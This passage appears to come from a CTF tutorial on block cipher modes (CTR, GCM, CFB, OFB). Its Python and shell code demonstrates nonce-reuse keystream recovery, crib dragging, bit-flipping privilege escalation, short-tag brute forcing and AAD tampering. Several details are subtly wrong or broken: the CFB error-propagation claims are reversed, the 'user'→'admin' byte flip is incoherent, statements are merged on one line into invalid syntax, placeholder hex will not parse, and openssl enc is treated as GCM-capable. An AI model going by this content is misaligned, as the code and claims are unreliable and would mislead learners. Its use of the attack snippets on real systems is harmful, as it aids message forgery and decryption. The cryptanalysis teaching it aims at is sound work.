EOF
```

**Detecting CTR Mode**

```python
# ctr_detector.py
def detect_ctr_mode(encryption_oracle):
    """
    CTR mode characteristics:
    1. Same plaintext produces different ciphertext (unlike ECB)
    2. No padding (length preserved)
    3. Bit flipping works predictably
    """
    
    # Test 1: Length preservation
    test_input = b"A" * 15  # Non-block-aligned
    ct = encryption_oracle(test_input)
    if len(ct) == len(test_input):
        print("Possible stream cipher (CTR/OFB/CFB)")
    
    # Test 2: Determinism with controlled nonce
    if len(encryption_oracle(b"test")) == len(encryption_oracle(b"test")):
        # Further testing needed
        pass
    
    # Test 3: Bit flipping
    original_ct = encryption_oracle(b"AAAAAAAAAAAAAAAA")
    # If we can flip bits and observe predictable changes, likely CTR
```

**CTF Scenarios**

```bash
# Common CTR CTF patterns:
# 1. Nonce reuse vulnerability (most common)
# 2. Keystream reuse across multiple messages
# 3. Bit flipping for authentication bypass
# 4. Known plaintext header (file format, protocol)

# Automated nonce reuse detection
python3 << 'EOF'
import sys
from collections import Counter

# Read multiple ciphertexts
ciphertexts = []
for file in sys.argv[1:]:
    with open(file, 'rb') as f:
        ciphertexts.append(f.read())

# Check for patterns indicating nonce reuse
# XOR ciphertexts and look for non-random distribution
for i in range(len(ciphertexts)):
    for j in range(i+1, len(ciphertexts)):
        xor = bytes(a ^ b for a, b in zip(ciphertexts[i], ciphertexts[j]))
        # Count null bytes (indicates same plaintext at position)
        nulls = xor.count(0)
        if nulls > len(xor) * 0.1:  # >10% null bytes suspicious
            print(f"Possible nonce reuse between file {i} and {j}")
EOF
```

**Weaknesses Summary**

- Nonce reuse catastrophic: allows plaintext recovery via XOR
- Malleable: bit flipping attacks without detection
- No authentication: ciphertext can be modified undetected
- Keystream reuse equivalent to one-time pad reuse
- Requires external mechanism to prevent nonce reuse

---

### GCM (Galois/Counter Mode)

GCM combines CTR mode encryption with GMAC authentication, providing both confidentiality and authenticity. Most widely used authenticated encryption mode.

**How GCM Works**

```
Encryption:
C[i] = P[i] ⊕ E(K, Nonce || Counter[i])
Tag = GHASH(H, AAD, C) ⊕ E(K, Nonce || 0)

Where:
- H = E(K, 0^128) (authentication key)
- AAD = Additional Authenticated Data (not encrypted)
- GHASH = Galois field multiplication-based MAC
- Tag = 128-bit authentication tag
```

**GCM Implementation**

```python
# gcm_mode.py
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def gcm_encrypt(plaintext, key, nonce=None, aad=b''):
    """AES-GCM encryption with authentication"""
    if nonce is None:
        nonce = get_random_bytes(12)  # 96-bit nonce recommended
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    # Add additional authenticated data (optional)
    if aad:
        cipher.update(aad)
    
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    return nonce, ciphertext, tag

def gcm_decrypt(ciphertext, key, nonce, tag, aad=b''):
    """AES-GCM decryption with verification"""
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    if aad:
        cipher.update(aad)
    
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except ValueError as e:
        print(f"Authentication failed: {e}")
        return None

# Example usage
key = get_random_bytes(16)  # AES-128
plaintext = b"flag{gcm_provides_authentication}"
aad = b"user_id=12345"  # Authenticated but not encrypted

nonce, ct, tag = gcm_encrypt(plaintext, key, aad=aad)
print(f"Nonce: {nonce.hex()}")
print(f"Ciphertext: {ct.hex()}")
print(f"Tag: {tag.hex()}")

# Decryption
pt = gcm_decrypt(ct, key, nonce, tag, aad=aad)
print(f"Plaintext: {pt}")
```

**Forbidden Attack (Nonce Reuse)**

GCM's authentication key H can be recovered if nonce is reused with two known plaintexts.

```python
# gcm_nonce_reuse.py
def gcm_nonce_reuse_attack(ct1, tag1, ct2, tag2, nonce, aad1=b'', aad2=b''):
    """
    Nonce reuse in GCM allows authentication key recovery
    [Unverified: Complex polynomial equation solving required]
    
    This is a simplified demonstration of the attack concept.
    Full implementation requires Galois field arithmetic.
    """
    
    # XOR ciphertexts (same as CTR nonce reuse)
    ct_xor = bytes(a ^ b for a, b in zip(ct1, ct2))
    
    # If plaintexts known, can recover keystream
    # Then can forge tags for arbitrary messages
    
    print("GCM nonce reuse detected!")
    print(f"Ciphertext XOR: {ct_xor.hex()}")
    print("[Inference: Authentication key H can be recovered via polynomial solving]")
    
    # Note: Actual attack requires solving polynomial equations in GF(2^128)
    # Libraries like SageMath needed for practical exploitation

# Using known plaintexts to recover authentication key
def recover_gcm_auth_key(pt1, ct1, tag1, pt2, ct2, tag2, nonce):
    """
    [Unverified: Requires advanced Galois field mathematics]
    
    Theoretical recovery of H (auth key) from two nonce-reused encryptions
    Practical implementation requires polynomial factorization in GF(2^128)
    """
    pass  # Complex implementation omitted
```

**Practical GCM Nonce Reuse Exploitation**

```python
# gcm_practical_nonce_reuse.py
def gcm_forge_with_nonce_reuse(known_pt1, ct1, tag1, ct2, nonce, key=None):
    """
    If nonce reused and one plaintext known:
    1. Recover keystream from (pt1, ct1)
    2. Decrypt ct2
    3. Potentially forge new messages
    """
    
    # Recover keystream (CTR component)
    keystream = bytes(p ^ c for p, c in zip(known_pt1, ct1))
    
    # Decrypt ct2
    pt2 = bytes(k ^ c for k, c in zip(keystream, ct2))
    
    print(f"Recovered plaintext 2: {pt2}")
    
    # Tag forgery requires H recovery (complex)
    print("[Inference: Tag forgery possible but requires auth key extraction]")
    
    return pt2

# Example
known_plain = b"GET /api/user HTTP/1.1\r\n"
ct1 = bytes.fromhex("a1b2c3d4e5f6...")
tag1 = bytes.fromhex("...")
ct2 = bytes.fromhex("f6e5d4c3b2a1...")
nonce = bytes.fromhex("...")  # Same nonce as ct1

recovered = gcm_forge_with_nonce_reuse(known_plain, ct1, tag1, ct2, nonce)
```

**Short Tag Attack**

GCM allows tag truncation (64-96 bits). Shorter tags reduce security.

```python
# gcm_short_tag.py
def gcm_short_tag_bruteforce(ciphertext, nonce, aad, key, tag_length=64):
    """
    [Inference: Shorter tags reduce brute force complexity]
    
    64-bit tag: 2^64 attempts (feasible for nation-states)
    96-bit tag: 2^96 attempts (infeasible)
    128-bit tag: 2^128 attempts (standard, secure)
    """
    
    from Crypto.Cipher import AES
    import itertools
    
    if tag_length == 128:
        print("128-bit tag: brute force infeasible")
        return None
    
    # Attempt forgery with shortened tag (demonstration only)
    attempts = 0
    max_attempts = min(2**20, 2**tag_length)  # Limit for demo
    
    for tag_candidate in range(max_attempts):
        tag = tag_candidate.to_bytes(tag_length // 8, 'big')
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        if aad:
            cipher.update(aad)
        
        try:
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            print(f"Tag found after {attempts} attempts: {tag.hex()}")
            return plaintext
        except:
            attempts += 1
    
    print(f"Tag not found in {attempts} attempts")
    return None
```

**AAD Manipulation**

Additional Authenticated Data is authenticated but not encrypted. Misuse can lead to vulnerabilities.

```python
# gcm_aad_attack.py
def test_aad_validation(encrypt_oracle, decrypt_oracle):
    """
    Test if AAD is properly validated
    
    Common mistakes:
    1. AAD not verified on decryption
    2. AAD reordering allowed
    3. AAD optional when should be required
    """
    
    # Encrypt with AAD
    original_aad = b"user_id=123;role=user"
    ct, tag = encrypt_oracle(b"secret_data", aad=original_aad)
    
    # Test 1: Modified AAD
    modified_aad = b"user_id=123;role=admin"
    try:
        pt = decrypt_oracle(ct, tag, aad=modified_aad)
        print("VULNERABLE: AAD modification not detected!")
        return True
    except:
        print("Secure: AAD modification rejected")
    
    # Test 2: Missing AAD
    try:
        pt = decrypt_oracle(ct, tag, aad=b'')
        print("VULNERABLE: Missing AAD not detected!")
        return True
    except:
        print("Secure: Missing AAD rejected")
    
    return False

# Example: Authentication bypass via AAD manipulation
def forge_authenticated_request(ct, tag, nonce, original_aad, target_aad):
    """
    If application doesn't properly verify AAD:
    - Change user_id, permissions, roles
    - Modify authenticated metadata
    """
    print(f"Original AAD: {original_aad}")
    print(f"Target AAD: {target_aad}")
    print("[Inference: If AAD not verified, tag remains valid with modified AAD]")
```

**Polynomial Forgery (Advanced)**

```python
# gcm_polynomial_forgery.py
def gcm_polynomial_representation():
    """
    [Unverified: Requires implementation of GF(2^128) operations]
    
    GCM tag computation:
    Tag = GHASH(H, AAD, C) ⊕ E(K, N||0)
    
    Where GHASH is polynomial evaluation in GF(2^128):
    GHASH = (AAD[1]*H^n + AAD[2]*H^(n-1) + ... + C[1]*H^m + ... + len(AAD||C)*H)
    
    If H recovered (via nonce reuse), can forge arbitrary tags
    """
    pass

# Practical attack using SageMath (pseudo-code)
"""
# sage_gcm_attack.sage
from sage.all import *

def recover_H_from_nonce_reuse(ct1, tag1, ct2, tag2, aad1, aad2):
    # Set up GF(2^128) with AES irreducible polynomial
    F.<x> = GF(2)[]
    K.<a> = GF(2^128, modulus=x^128 + x^7 + x^2 + x + 1)
    
    # Convert tags and ciphertexts to GF(2^128) elements
    # ... conversion code ...
    
    # Solve for H using polynomial equations
    # tag1 - tag2 = GHASH(H, aad1, ct1) - GHASH(H, aad2, ct2)
    # ... solve polynomial equation ...
    
    return H

# Usage:
# H = recover_H_from_nonce_reuse(ct1, tag1, ct2, tag2, aad1, aad2)
# forge_tag = compute_ghash(H, forged_aad, forged_ct)
"""
```

**Tools and Commands**

```bash
# OpenSSL GCM encryption
openssl enc -aes-256-gcm -in plaintext.txt -out cipher.bin \
  -K $(xxd -p -c32 key.bin) \
  -iv $(xxd -p nonce.bin)

# Note: OpenSSL may not output tag separately in enc command
# Use EVP API for full GCM control

# Python command-line GCM
python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import sys

key = bytes.fromhex(sys.argv[1])
nonce = get_random_bytes(12)
plaintext = sys.stdin.buffer.read()

cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ct, tag = cipher.encrypt_and_digest(plaintext)

print(f"Nonce: {nonce.hex()}")
print(f"Ciphertext: {ct.hex()}")
print(f"Tag: {tag.hex()}")
EOF

# CyberChef GCM operations
# Input → AES Encrypt → Mode: GCM → Key: [hex] → Nonce: [hex]
# Returns: ciphertext || tag
```

**CTF Scenarios**

```python
# gcm_ctf_patterns.py

# Pattern 1: Nonce reuse detection
def detect_gcm_nonce_reuse(captured_messages):
    """Check for repeated nonces in captured traffic"""
    nonces = [msg['nonce'] for msg in captured_messages]
    duplicates = {n: nonces.count(n) for n in set(nonces) if nonces.count(n) > 1}
    
    if duplicates:
        print(f"Nonce reuse detected: {duplicates}")
        return True
    return False

# Pattern 2: Short tag exploitation
def exploit_short_tag(ct, short_tag, nonce, aad, tag_bits=64):
    """Brute force shortened GCM tags"""
    print(f"Attempting {2**tag_bits} tag combinations...")
    print("[Inference: 64-bit tags feasible for offline attack]")

# Pattern 3: AAD privilege escalation
def escalate_via_aad(ct, tag, nonce, known_aad):
    """
    Common CTF scenario:
    - AAD contains user_id=X or role=user
    - Application doesn't verify AAD integrity
    - Modify AAD to escalate privileges
    """
    privileged_aad = known_aad.replace(b'role=user', b'role=admin')
    print(f"Attempting authentication with: {privileged_aad}")
    # If app doesn't verify AAD, tag still validates

# Pattern 4: Forbidden attack (nonce reuse + known plaintext)
def forbidden_attack_demo(ct1, tag1, ct2, tag2, known_pt1, nonce):
    """Demonstrate CTR component exploitation"""
    keystream = bytes(p ^ c for p, c in zip(known_pt1, ct1))
    recovered_pt2 = bytes(k ^ c for k, c in zip(keystream, ct2))
    print(f"Recovered via nonce reuse: {recovered_pt2}")
```

**Weaknesses Summary**

- Nonce reuse catastrophic: allows authentication key recovery and forgery
- Short tags reduce security (64-bit tags attackable with sufficient resources) [Inference]
- AAD misuse can lead to authentication bypass if not properly verified
- More complex implementation than CTR (potential for bugs)
- Requires careful nonce management (sequential counter or random with collision probability consideration)

---

### CFB (Cipher Feedback)

CFB mode converts block cipher into self-synchronizing stream cipher. Encrypts previous ciphertext block, then XORs with plaintext. Can operate on partial blocks.

**How CFB Works**

```
Encryption:
C[0] = P[0] ⊕ E(K, IV)
C[i] = P[i] ⊕ E(K, C[i-1])

Decryption:
P[0] = C[0] ⊕ E(K, IV)
P[i] = C[i] ⊕ E(K, C[i-1])

Note: Decryption uses encryption function, not decryption function
```

**CFB Implementation**

```python
# cfb_mode.py
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def cfb_encrypt(plaintext, key, iv=None, segment_size=128):
    """
    segment_size: bits to process at once (8, 64, or 128 typical)
    CFB8 = 8-bit segments, CFB128 = 128-bit segments
    """
    if iv is None:
        iv = get_random_bytes(16)
    
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=segment_size)
    ciphertext = cipher.encrypt(plaintext)
    
    return iv, ciphertext

def cfb_decrypt(ciphertext, key, iv, segment_size=128):
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=segment_size)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

# Example
key = get_random_bytes(16)
plaintext = b"flag{cfb_mode_example}"

# CFB-128 (full block)
iv, ct = cfb_encrypt(plaintext, key, segment_size=128)
print(f"IV: {iv.hex()}")
print(f"Ciphertext: {ct.hex()}")

pt = cfb_decrypt(ct, key, iv, segment_size=128)
print(f"Decrypted: {pt}")

# CFB-8 (byte-by-byte)
iv8, ct8 = cfb_encrypt(plaintext, key, segment_size=8)
print(f"CFB-8 Ciphertext: {ct8.hex()}")
```

**IV Manipulation Attack**

```python
# cfb_iv_attack.py
def cfb_iv_manipulation(ciphertext, iv, known_plaintext, desired_plaintext):
    """
    First plaintext block: P[0] = C[0] ⊕ E(K, IV)
    Therefore: C[0] = P[0] ⊕ E(K, IV)
    
    To change P[0] to P'[0], modify IV:
    IV' such that E(K, IV') = E(K, IV) ⊕ P[0] ⊕ P'[0]
    
    However, E(K, IV) is unknown without key.
    Alternative: Modify C[0] to affect P[1] (like CBC)
    """
    
    # Attack: Flip bits in IV to flip bits in first plaintext block
    # Since P[0] = C[0] ⊕ E(K, IV)
    # And E(K, IV) is deterministic for given IV
    
    # [Inference: Without key, direct IV manipulation to target specific 
    # plaintext is not feasible, but bit flipping in C[i] affects P[i+1]]
    
    modified_iv = bytearray(iv)
    # Flipping bits in IV will flip bits in P[0]
    # But we don't know E(K, IV), so result is unpredictable
    
    print("[Inference: CFB IV attack limited compared to CBC]")
    return bytes(modified_iv)

# More practical: Bit flipping in ciphertext
def cfb_bit_flip(ciphertext, position, bit_mask):
    """
    Flipping bit in C[i]:
    - Corrupts P[i] at that position
    - Flips corresponding bit in P[i+1]
    
    Similar to CBC but affects current and next block differently
    """
    modified = bytearray(ciphertext)
    modified[position] ^= bit_mask
    
    # C[i] affects:
    # 1. P[i] (XOR relationship, unpredictable corruption)
    # 2. P[i+1] (used as input to E(K, C[i]), predictable flip)
    
    return bytes(modified)

# Example: Modify second block via first block manipulation
original_ct = bytes.fromhex("a1b2c3d4e5f6...")
# To change byte in block 2, modify corresponding byte in block 1
position_in_block1 = 5
desired_flip = 0x01  # Flip bit 0

forged_ct = cfb_bit_flip(original_ct, position_in_block1, desired_flip)
# This will flip bit in block 2 at corresponding position
```

**Self-Synchronization Property**

CFB re-synchronizes after one block if ciphertext corruption occurs.

```python
# cfb_self_sync.py
def demonstrate_cfb_self_sync():
    """
    CFB property: After block_size bits of corruption,
    stream re-synchronizes automatically
    """
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    plaintext = b"A" * 100
    
    # Encrypt
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128)
    ciphertext = cipher.encrypt(plaintext)
    
    # Corrupt one block (16 bytes)
    corrupted = bytearray(ciphertext)
    corrupted[16:32] = b'\x00' * 16  # Corrupt block 2
    
    # Decrypt corrupted ciphertext
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128)
    decrypted = cipher.decrypt(bytes(corrupted))
    
    # Analysis
    print("Original:", plaintext.hex())
    print("Decrypted:", decrypted.hex())
    print("\nBlocks affected:")
    print(f"Block 0 (0-15): {'GOOD' if decrypted[0:16] == plaintext[0:16] else 'CORRUPTED'}")
    print(f"Block 1 (16-31): {'GOOD' if decrypted[16:32] == plaintext[16:32] else 'CORRUPTED'}")
    print(f"Block 2 (32-47): {'GOOD' if decrypted[32:48] == plaintext[32:48] else 'CORRUPTED'}")
    print(f"Block 3 (48-63): {'GOOD' if decrypted[48:64] == plaintext[48:64] else 'CORRUPTED'}")
    
    # [Inference: Corruption in block N affects blocks N and N+1, then recovers]

demonstrate_cfb_self_sync()
```

**CFB-8 Specific Attacks**

CFB with 8-bit segments (byte-at-a-time) has unique properties.

```python
# cfb8_attack.py
def cfb8_analysis():
    """
    CFB-8 processes one byte at a time
    Shift register: [IV] → [IV[1:] || C[0]] → [IV[2:] || C[0:2]] → ...
    
    Each byte encrypted depends on previous 16 bytes of ciphertext
    """
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    plaintext = b"ABCDEFGHIJKLMNOP"
    
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=8)
    ciphertext = cipher.encrypt(plaintext)
    
    # Analyze byte-by-byte encryption
    print("CFB-8 Byte-by-byte analysis:")
    for i, (p, c) in enumerate(zip(plaintext, ciphertext)):
        print(f"Byte {i}: P={chr(p)} C={c:02x}")
    
    # CFB-8 bit flipping
    modified = bytearray(ciphertext)
    modified[0] ^= 0xFF  # Flip all bits in first byte
    
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=8)
    decrypted = cipher.decrypt(bytes(modified))
    
    print("\nAfter flipping first ciphertext byte:")
    print(f"Original:  {plaintext}")
    print(f"Decrypted: {decrypted}")
    print(f"[Inference: First byte corrupted, affects next 16 bytes, then recovers]")

cfb8_analysis()
```

**Known Plaintext Attack (Limited)**

```python
# cfb_known_plaintext.py
def cfb_known_plaintext_keystream(known_plaintext, ciphertext, iv):
    """
    If first block plaintext known:
    C[0] = P[0] ⊕ E(K, IV)
    Therefore: E(K, IV) = P[0] ⊕ C[0]
    
    This reveals one keystream block but doesn't help decrypt rest
    (each subsequent block uses different input to E)
    """
    
    keystream_block1 = bytes(p ^ c for p, c in zip(known_plaintext[:16], 
                                                     ciphertext[:16]))
    
    print(f"Recovered E(K, IV): {keystream_block1.hex()}")
    print("[Inference: Keystream recovery limited; each block uses different input]")
    
    # Cannot decrypt further blocks without knowing ciphertext blocks
    # which are used as input to encryption function
    
    return keystream_block1
```

**Tools and Commands**

```bash
# OpenSSL CFB mode
openssl enc -aes-256-cfb -in plaintext.txt -out cipher.bin \
  -K $(xxd -p -c32 key.bin) -iv $(xxd -p iv.bin)

openssl enc -d -aes-256-cfb -in cipher.bin -out decrypted.txt \
  -K $(xxd -p -c32 key.bin) -iv $(xxd -p iv.bin)

# CFB-8 mode (OpenSSL uses cfb8 suffix)
openssl enc -aes-256-cfb8 -in plaintext.txt -out cipher.bin \
  -K $(xxd -p -c32 key.bin) -iv $(xxd -p iv.bin)

# Python CFB with different segment sizes
python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)  # AES-256
iv = get_random_bytes(16)
plaintext = b"Test message for CFB mode"

# CFB-128 (full block)
cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128)
ct_128 = cipher.encrypt(plaintext)
print(f"CFB-128: {ct_128.hex()}")

# CFB-8 (byte-by-byte)
cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=8)
ct_8 = cipher.encrypt(plaintext)
print(f"CFB-8: {ct_8.hex()}")
EOF
```

**CTF Scenarios**

```python
# cfb_ctf_patterns.py

# Pattern 1: Bit flipping for authentication bypass
def cfb_privilege_escalation(ciphertext, known_position):
    """
    If we know "role=user" is at position X in plaintext,
    flip bits in C[X-16:X] to modify "user" in next block
    """
    modified = bytearray(ciphertext)
    
    # Calculate position in previous block that affects target
    target_block = known_position // 16
    prev_block_start = (target_block - 1) * 16
    offset = known_position % 16
    
    # Flip bits: "user" → "admin"
    # u=0x75, a=0x61: XOR with 0x14
    modified[prev_block_start + offset] ^= ord('u') ^ ord('a')
    
    return bytes(modified)

# Pattern 2: Error correction via self-synchronization
def exploit_cfb_self_sync(ciphertext):
    """
    CFB resynchronizes after one block of corruption
    Can be used to identify block boundaries
    """
    test_positions = range(0, len(ciphertext), 4)
    
    for pos in test_positions:
        corrupted = bytearray(ciphertext)
        corrupted[pos] ^= 0xFF
        
        # Decrypt and check where corruption ends
        # [Implementation depends on having decrypt function]
        print(f"Corrupted at position {pos}")

# Pattern 3: CFB-8 stream cipher characteristics
def cfb8_stream_attack(ciphertext, known_header):
    """
    CFB-8 acts like stream cipher
    If file format header known, can recover keystream
    """
    if len(known_header) >= 16:
        # First 16 bytes recovery possible
        keystream = bytes(k ^ c for k, c in zip(known_header, ciphertext))
        print(f"Partial keystream: {keystream.hex()}")
        
        # But doesn't help with rest (feedback from ciphertext)
        print("[Inference: Limited utility compared to pure stream ciphers]")
```

**Weaknesses Summary**

- Bit flipping in C[i] affects P[i] unpredictably and P[i+1] predictably
- IV manipulation affects first plaintext block
- Self-synchronization can be exploited for error analysis
- CFB-8 slower than CFB-128 and has different error propagation
- No authentication (vulnerable to modification)
- Less commonly used than CTR or CBC in modern systems

---

### OFB (Output Feedback)

OFB mode converts block cipher into synchronous stream cipher. Generates keystream independent of plaintext/ciphertext, making encryption and decryption identical operations.

**How OFB Works**

```
Keystream generation:
O[0] = E(K, IV)
O[i] = E(K, O[i-1])

Encryption/Decryption:
C[i] = P[i] ⊕ O[i]
P[i] = C[i] ⊕ O[i]

Note: Same operation for encryption and decryption
```

**OFB Implementation**

```python
# ofb_mode.py
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def ofb_encrypt(plaintext, key, iv=None):
    """OFB encryption"""
    if iv is None:
        iv = get_random_bytes(16)
    
    cipher = AES.new(key, AES.MODE_OFB, iv=iv)
    ciphertext = cipher.encrypt(plaintext)
    
    return iv, ciphertext

def ofb_decrypt(ciphertext, key, iv):
    """OFB decryption (identical to encryption)"""
    cipher = AES.new(key, AES.MODE_OFB, iv=iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

# Manual OFB implementation to show keystream generation
def manual_ofb(plaintext, key, iv):
    """
    Demonstrates OFB keystream generation
    """
    from Crypto.Cipher import AES
    
    cipher_ecb = AES.new(key, AES.MODE_ECB)
    
    keystream = b''
    feedback = iv
    
    # Generate keystream blocks
    blocks_needed = (len(plaintext) + 15) // 16
    for _ in range(blocks_needed):
        feedback = cipher_ecb.encrypt(feedback)
        keystream += feedback
    
    # XOR with plaintext
    ciphertext = bytes(p ^ k for p, k in zip(plaintext, keystream))
    
    return ciphertext, keystream[:len(plaintext)]

# Example
key = get_random_bytes(16)
iv = get_random_bytes(16)
plaintext = b"flag{ofb_mode_demonstration}"

iv, ct = ofb_encrypt(plaintext, key, iv)
print(f"IV: {iv.hex()}")
print(f"Ciphertext: {ct.hex()}")

pt = ofb_decrypt(ct, key, iv)
print(f"Decrypted: {pt}")

# Manual demonstration
ct_manual, keystream = manual_ofb(plaintext, key, iv) print(f"\nManual OFB:") print(f"Keystream: {keystream.hex()}") print(f"Ciphertext: {ct_manual.hex()}")

````

**IV Reuse Attack**

OFB with IV reuse is equivalent to one-time pad reuse (keystream reuse).

```python
# ofb_iv_reuse.py
def ofb_iv_reuse_attack(ct1, ct2, known_pt1=None):
    """
    If same IV used with same key:
    C1 = P1 ⊕ KeyStream
    C2 = P2 ⊕ KeyStream
    Therefore: C1 ⊕ C2 = P1 ⊕ P2 (many-time pad)
    """
    
    # XOR two ciphertexts encrypted with same IV
    xor_result = bytes(a ^ b for a, b in zip(ct1, ct2))
    
    if known_pt1:
        # Recover plaintext 2
        pt2 = bytes(x ^ p for x, p in zip(xor_result, known_pt1))
        print(f"Recovered plaintext 2: {pt2}")
        return pt2
    else:
        # Crib dragging
        print("Attempting crib dragging...")
        cribs = [b'flag{', b'password', b'secret', b'admin', b'user', 
                 b'the ', b'CTF{', b'key=']
        
        for crib in cribs:
            for offset in range(len(xor_result) - len(crib)):
                candidate = bytes(xor_result[offset+i] ^ crib[i] 
                                  for i in range(len(crib)))
                
                # Check if looks like valid text
                if all(32 <= b < 127 for b in candidate):
                    print(f"Possible at offset {offset}: {candidate}")
                    print(f"  Implies CT1 contains: {crib}")

# Example usage
ct1 = bytes.fromhex("a1b2c3d4e5f6a7b8c9d0e1f2...")
ct2 = bytes.fromhex("f1e2d3c4b5a69788...")
known_pt1 = b"GET /api/user HTTP/1.1\r\n"

ofb_iv_reuse_attack(ct1, ct2, known_pt1)
````

**Keystream Recovery via Known Plaintext**

```python
# ofb_keystream_recovery.py
def recover_ofb_keystream(plaintext, ciphertext):
    """
    OFB keystream: KeyStream = P ⊕ C
    Once recovered, can decrypt any message encrypted with same IV
    """
    keystream = bytes(p ^ c for p, c in zip(plaintext, ciphertext))
    return keystream

def decrypt_with_keystream(ciphertext, keystream):
    """Decrypt using recovered keystream"""
    plaintext = bytes(c ^ k for c, k in zip(ciphertext, keystream))
    return plaintext

def extend_keystream(partial_keystream, key, iv, total_length):
    """
    [Inference: If we have key and IV, can generate full keystream]
    If key unknown but partial keystream known, cannot extend
    (feedback depends on previous encrypted output, not plaintext)
    """
    from Crypto.Cipher import AES
    
    cipher = AES.new(key, AES.MODE_OFB, iv=iv)
    
    # Generate keystream by encrypting zeros
    zeros = b'\x00' * total_length
    full_keystream = cipher.encrypt(zeros)
    
    return full_keystream

# Example: Known plaintext attack
known_plain = b"POST /login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n"
captured_ct = bytes.fromhex("a1b2c3d4...")

keystream = recover_ofb_keystream(known_plain, captured_ct[:len(known_plain)])
print(f"Recovered keystream: {keystream.hex()}")

# Use keystream to decrypt another message (same IV)
other_ct = bytes.fromhex("f6e5d4c3...")
decrypted = decrypt_with_keystream(other_ct, keystream)
print(f"Decrypted message: {decrypted}")

# Note: Only works for length of known plaintext
print(f"[Inference: Keystream recovery limited to known plaintext length]")
```

**Bit Flipping Attack**

OFB is malleable like all stream ciphers.

```python
# ofb_bit_flip.py
def ofb_bit_flip_attack(ciphertext, known_plaintext, desired_plaintext):
    """
    Modify ciphertext to decrypt to desired plaintext
    C' = C ⊕ P ⊕ P'
    """
    
    if len(known_plaintext) != len(desired_plaintext):
        raise ValueError("Plaintext lengths must match")
    
    modified_ct = bytearray(ciphertext)
    
    for i, (known, desired) in enumerate(zip(known_plaintext, desired_plaintext)):
        modified_ct[i] ^= known ^ desired
    
    return bytes(modified_ct)

# Example: Privilege escalation
original_ct = bytes.fromhex("a1b2c3d4e5f6a7b8...")
known_pt = b"user_id=123;role=user;admin=false"
desired_pt = b"user_id=123;role=admin;admin=true"

forged_ct = ofb_bit_flip_attack(original_ct, known_pt, desired_pt)
print(f"Original ciphertext: {original_ct.hex()}")
print(f"Forged ciphertext:  {forged_ct.hex()}")
print("[Inference: Forged ciphertext will decrypt to desired plaintext]")

# Targeted bit flip example
def flip_specific_position(ciphertext, position, current_byte, target_byte):
    """Flip specific byte in plaintext via ciphertext modification"""
    modified = bytearray(ciphertext)
    modified[position] ^= current_byte ^ target_byte
    return bytes(modified)

# Change byte at position 20 from 'u' to 'a'
flipped = flip_specific_position(original_ct, 20, ord('u'), ord('a'))
```

**Keystream Period Detection**

OFB keystream eventually cycles if IV chosen poorly.

```python
# ofb_keystream_cycle.py
def detect_ofb_cycle(key, iv, max_blocks=1000000):
    """
    [Unverified: Theoretical cycle detection]
    
    OFB keystream: O[i] = E(K, O[i-1])
    If O[i] = O[j] for i < j, keystream cycles
    
    For AES-128, cycle length up to 2^128 blocks (unlikely in practice)
    For weak ciphers or small block sizes, cycles may occur
    """
    from Crypto.Cipher import AES
    
    cipher_ecb = AES.new(key, AES.MODE_ECB)
    
    seen_outputs = {}
    feedback = iv
    
    for block_num in range(max_blocks):
        feedback = cipher_ecb.encrypt(feedback)
        
        if feedback in seen_outputs:
            cycle_start = seen_outputs[feedback]
            cycle_length = block_num - cycle_start
            print(f"Cycle detected!")
            print(f"Cycle start: block {cycle_start}")
            print(f"Cycle length: {cycle_length} blocks")
            return cycle_start, cycle_length
        
        seen_outputs[feedback] = block_num
        
        if block_num % 100000 == 0:
            print(f"Checked {block_num} blocks, no cycle yet...")
    
    print(f"No cycle found in {max_blocks} blocks")
    return None, None

# [Inference: For AES with proper IV, cycle detection impractical]
# For DES (64-bit blocks), cycle more feasible at 2^32 blocks on average
```

**No Error Propagation**

Unlike CBC/CFB, OFB has no error propagation.

```python
# ofb_error_propagation.py
def demonstrate_ofb_no_error_propagation():
    """
    OFB property: Bit errors in ciphertext cause same bit errors in plaintext
    No cascading corruption like CBC/CFB
    """
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    plaintext = b"A" * 100
    
    # Encrypt
    cipher = AES.new(key, AES.MODE_OFB, iv=iv)
    ciphertext = cipher.encrypt(plaintext)
    
    # Corrupt single bit in middle
    corrupted = bytearray(ciphertext)
    corrupted[50] ^= 0x01  # Flip one bit
    
    # Decrypt
    cipher = AES.new(key, AES.MODE_OFB, iv=iv)
    decrypted = cipher.decrypt(bytes(corrupted))
    
    # Analysis
    errors = sum(1 for a, b in zip(plaintext, decrypted) if a != b)
    print(f"Original plaintext: {plaintext[:60]}")
    print(f"Decrypted:         {decrypted[:60]}")
    print(f"\nTotal errors: {errors} byte(s)")
    print(f"Error location: byte {50}")
    print("[Inference: Only corrupted byte affected, no propagation]")
    
    # Compare with CBC (would corrupt current + next block)
    print("\nOFB: Localized errors (1 byte)")
